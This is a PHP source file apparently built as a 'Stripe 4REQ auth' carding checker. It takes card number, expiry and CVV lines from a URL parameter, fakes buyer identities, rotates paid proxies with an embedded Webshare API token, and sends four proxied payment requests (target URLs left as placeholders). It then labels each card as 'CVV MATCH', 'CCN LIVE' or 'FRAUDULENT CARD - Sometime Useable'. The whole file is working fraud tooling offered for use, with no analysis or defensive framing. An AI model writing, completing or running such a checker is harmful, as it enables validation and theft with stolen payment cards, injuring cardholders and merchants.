<?php

############DRAGON-MSETER]##########
############[PHP SETUP]#############

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

 

#########################[Functions + Lista]############################

          function multiexplode($delimiters, $string){
                  $one = str_replace($delimiters, $delimiters[0], $string);
                  $two = explode($delimiters[0], $one);
          return $two;}
                  $lista = $_GET['lista'];
                  $cc = multiexplode(array(":", "|", ""), $lista)[0];
                  $mes = multiexplode(array(":", "|", ""), $lista)[1];
                  $ano = multiexplode(array(":", "|", ""), $lista)[2];
                  $cvv = multiexplode(array(":", "|", ""), $lista)[3];
          function GetStr($string, $start, $end){
                  $str = explode($start, $string);
                  $str = explode($end, $str[1]);
          return $str[0];}
                  $amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
                  $amount2 = 'Not Charged';

                  $MADEBY = " DRAGON MASTER "; /// PUT YOUR NAME

          function value($str,$find_start,$find_end){
                  $start = @strpos($str,$find_start);
          if ($start === false){
          return "";}
                  $length = strlen($find_start);
                  $end    = strpos(substr($str,$start +$length),$find_end);
          return trim(substr($str,$start +$length,$end));}
          function mod($dividendo,$divisor){
          return round($dividendo - (floor($dividendo/$divisor)*$divisor));}

          function AllinOne($data = 42){
                return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);};
           

          #########################

                  $guid = AllinOne();
                  $muid = AllinOne();
                  $sid = AllinOne();

#########################[BIN LOOK-UP]############################

          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
          curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
          curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch); 
                $emoji = GetStr($fim, '"emoji":"', '"'); 
                if(strpos($fim, '"type":"credit"') !== false){
                }
                curl_close($ch);

#########################

          $ch = curl_init();
          $bin = substr($cc, 0,6);
          curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  $bindata = curl_exec($ch);
                  $binna = json_decode($bindata,true);
                  $brand = $binna['scheme'];
                  $country = $binna['country']['name'];
                  $type = $binna['type'];
                  $bank = $binna['bank']['name'];
                  curl_close($ch);

                  $bindata1 = " $type - $brand - $country $emoji"; ///CREDIT - MASTERCARD - UNITED STATES 🇺🇸

#########################[Randomizing Details]############################

        $get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $first = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","outlook.com");
        $serv_rnd = $serve_arr[array_rand($serve_arr)];
        $email= str_replace("example.com", $serv_rnd, $email);
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $zip = $matches1[1][0];

#################[Webshare Proxy]#######################

        //How To Make Webshare Token First Make Your Webshare [FREE] OR [PAID] Acc Then Go To Webshare Dashboard. 
        //Dashboard There You Get One Button With Then Name Of API Go There And Select Keys Make Token From There.e.

        $web = array(
        1 => '2a952592de542903da4c865330b95795db1ffdcb', //2a952592de542903da4c865330b95795db1ffdcb
          ); 
          $share = array_rand($web);
          $webshare_token = $web[$share];

        $prox = curl_init();
        curl_setopt($prox, CURLOPT_URL, 'https://proxy.webshare.io/api/proxy/list/');
        curl_setopt($prox, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($prox, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array();
        $headers[] = 'Authorization: Token '.$webshare_token.'';
        curl_setopt($prox, CURLOPT_HTTPHEADER, $headers);
        $webshare = curl_exec($prox);
        
        curl_close($prox);

        $prox_res = json_decode($webshare, 1);
        $count = $prox_res['count'];
        $random = rand(0,$count-1);

        $proxy_ip = $prox_res['results'][$random]['proxy_address'];
        $proxy_port = $prox_res['results'][$random]['ports']['socks5'];
        $proxy_user = $prox_res['results'][$random]['username'];
        $proxy_pass = $prox_res['results'][$random]['password'];

        $proxy = ''.$proxy_ip.':'.$proxy_port.'';
        $credentials = ''.$proxy_user.':'.$proxy_pass.'';
        $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";

        // FOR SHOWING IP OR PROXY ADD THIS IN Responses [IP :- '.$proxy.']

        #################[Proxy Live Tester Made By Dragon Master]#######################

        $rotate = ''.$proxy_user.'-rotate:'.$proxy_pass.'';

        $ip = array(
        1 => 'socks5://p.webshare.io:1080',
        2 => 'http://p.webshare.io:80',
             ); 
             $socks = array_rand($ip);
             $socks5 = $ip[$socks];

        $url = "https://api.ipify.org/";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_PROXY, $socks5);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
        $ip1 = curl_exec($ch);
        curl_close($ch);
        ob_flush();
        if (isset($ip1)){
        $ip = 'Live ✅';
        }
        if (empty($ip1)){
        $ip = ' Dead❌:-'.$webshare_token.' | IP :- '.$proxy.' ';
        }

        //echo '『 Proxy: '.$ip.' 』 ';

#########################[1 REQ]############################


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,1);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
        curl_setopt($ch, CURLOPT_USERAGENT,$useragent);
        curl_setopt($ch, CURLOPT_URL, '....');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: ...',
               'method: POST',
               'path: ...',
               'scheme: https',
               'accept: ....',
               'accept-language: en-US,en;q=0.9',
               'content-type: ....',
               'origin: ....',
               'referer: ....',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '.....');

         $r1 = curl_exec($ch);
         $token1 = trim(strip_tags(getstr($r1,'"sessionId":"','"')));

#########################[2 REQ]############################


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,1);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
        curl_setopt($ch, CURLOPT_USERAGENT,$useragent);
        curl_setopt($ch, CURLOPT_URL, '....');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: ...',
               'method: POST',
               'path: ...',
               'scheme: https',
               'accept: ....',
               'accept-language: en-US,en;q=0.9',
               'content-type: ....',
               'origin: ....',
               'referer: ....',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '.....');

         $r2 = curl_exec($ch);
         $token2 = trim(strip_tags(getstr($r2,'"id": "','"')));

#########################[3 REQ]############################


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,1);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
        curl_setopt($ch, CURLOPT_USERAGENT,$useragent);
        curl_setopt($ch, CURLOPT_URL, '....');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: ...',
               'method: POST',
               'path: ...',
               'scheme: https',
               'accept: ....',
               'accept-language: en-US,en;q=0.9',
               'content-type: ....',
               'origin: ....',
               'referer: ....',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '.....');

         $r3 = curl_exec($ch);
         $token3 = trim(strip_tags(getstr($r3,'"id": "','"')));

#########################[4 REQ]############################


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,1);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
        curl_setopt($ch, CURLOPT_USERAGENT,$useragent);
        curl_setopt($ch, CURLOPT_URL, '....');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: ...',
               'method: POST',
               'path: ...',
               'scheme: https',
               'accept: ....',
               'accept-language: en-US,en;q=0.9',
               'content-type: ....',
               'origin: ....',
               'referer: ....',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '.....');

         $r4 = curl_exec($ch);
         $token4 = trim(strip_tags(getstr($r4,'"id": "','"')));


#########################[Responses]############################

if(strpos($r3, '"seller_message": "Payment complete."' )) {
  $status = '#CVV';
  $cc_code = 'CHARGE PASS';
}
elseif(strpos($r3,'"cvc_check": "pass",')){
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
}
elseif(strpos($r3, "Thank You For Donation." )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
}
elseif(strpos($r4, "Thank You." )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
}
elseif(strpos($r3,'"status": "succeeded"')){
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
}
elseif(strpos($r3, 'Your card zip code is incorrect.' )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
}
elseif(strpos($r3, "incorrect_zip" )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
}
elseif(strpos($r3, "Success" )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
}
elseif(strpos($r3, "succeeded." )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
}
elseif(strpos($r2,"fraudulent")){
  $status = '#CVV';
  $cc_code = '『 FRAUDULENT CARD - Sometime Useable 』';
}
elseif(strpos($r3,"fraudulent",)){
  $status = '#CVV';
  $cc_code = '『 FRAUDULENT CARD - Sometime Useable 』';
}
elseif(strpos($r3, 'Your card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
}
elseif(strpos($r3, "insufficient_funds")) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
}
elseif(strpos($r3, "lost_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Lost_Card 』';
}
elseif(strpos($r3, "stolen_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Stolen_Card 』';
}  
elseif(strpos($r2, 'security code is incorrect.' )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
}
elseif(strpos($r3, "Your card's security code is incorrect." )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
}
elseif(strpos($r3, "Your card's security code is incorrect." )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
}
elseif(strpos($r2, 'security code is invalid.' )) {
  $status = 'Dead❌';
  $cc_code = 'Security Code Is Invalid.';
}
elseif(strpos($r2, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
}
elseif(strpos($r3, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
}
elseif(strpos($r4, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
}
elseif(strpos($r2, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
}
elseif(strpos($r2, 'Your card has expired.')) {
  $status = 'Dead❌';
  $cc_code = '『 Expired Card 』';
}
elseif(strpos($r2, "expired_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Expired Card 』';
}
elseif(strpos($r3, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
}
elseif(strpos($r3, 'Your card has expired.')) {
  $status = 'Dead❌';
  $cc_code = '『 Expired Card 』';
}
elseif(strpos($r3, "expired_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Expired Card 』';
}
elseif(strpos($r3, 'Your card number is incorrect.')) {
  $status = 'Dead❌';
  $cc_code = '『 Incorrect Card Number 』';
}
elseif(strpos($r2, "incorrect_number")) {
  $status = 'Dead❌';
  $cc_code = '『 Incorrect Card Number 』';
}
elseif(strpos($r3, "do_not_honor")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Do_Not_Honor 』';
}
elseif(strpos($r1, "generic_decline")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Generic_Decline 』';
}
elseif(strpos($r2, "generic_decline")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Generic_Decline 』';
}
elseif(strpos($r3, "generic_decline")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Generic_Decline 』';
}
elseif(strpos($r3, "generic_decline")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Generic_Decline 』';
}
elseif(strpos($r1, 'Your card was declined.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Declined 』';
}
elseif(strpos($r2, 'Your card was declined.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Declined 』';
}
elseif(strpos($r3, 'Your card was declined.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Declined 』';
}
elseif(strpos($r3,'"cvc_check": "unavailable"')){
  $status = 'Dead❌';
  $cc_code = '『  Security Code Check : Unavailable [Proxy Dead/change IP] 』';
}
elseif(strpos($r2,'"cvc_check": "fail"')){
  $status = 'Dead❌';
  $cc_code = '『  Security Code Check : Unavailable [Proxy Dead/change IP] 』';
}
elseif(strpos($r2,"parameter_invalid_empty")){
  $status = 'Dead❌';
  $cc_code = '『 Declined : Missing Card Details 』';
}
elseif (strpos($r3,'Your card does not support this type of purchase.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Doesnt Support Purchase 』';
}
elseif (strpos($r1,'Your card does not support this type of purchase.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Doesnt Support Purchase 』';
}
elseif(strpos($r2,"transaction_not_allowed")){
  $status = 'Dead❌';
  $cc_code = '『 Card Doesnt Support Purchase 』';
}
elseif(strpos($r3,"three_d_secure_redirect")){
  $status = 'Dead❌';
  $cc_code = '『 Card Doesnt Support Purchase 』';
}
elseif(strpos($r3, 'Card is declined by your bank, please contact them for additional information.')) {
  $status = 'Dead❌';
  $cc_code = '『 3D Secure Redirect 』';
}
elseif(strpos($r2,"missing_payment_information")){
  $status = 'Dead❌';
  $cc_code = '『 Missing Payment Information 』';
}
elseif(strpos($r2, "Payment cannot be processed, missing credit card number")) {
  $status = 'Dead❌';
  $cc_code = '『 Missing Credit Card Number 』';
}
else {
  $status = 'Dead❌';
  $cc_code = '『 Dead Proxy/Error Not listed 』';
}
//=======================[Responses-END]==============================//

    echo '『 Proxy: '.$ip.' 』 『' . $MADEBY . '』 -» [STRIPE 4REQ AUTH] -» ['.$status.'] -» ' . $lista . ' -» '.$cc_code.'';


curl_close($ch);
ob_flush();

//echo "<b>1REQ Result:</b> $r1<br><br>";
//echo "<b>2REQ Result:</b> $r2<br><br>";
//echo "<b>3REQ Result:</b> $r3<br><br>";
//echo "<b>4REQ Result:</b> $r4<br><br>";


############DRAGON-MSETER]##########
?>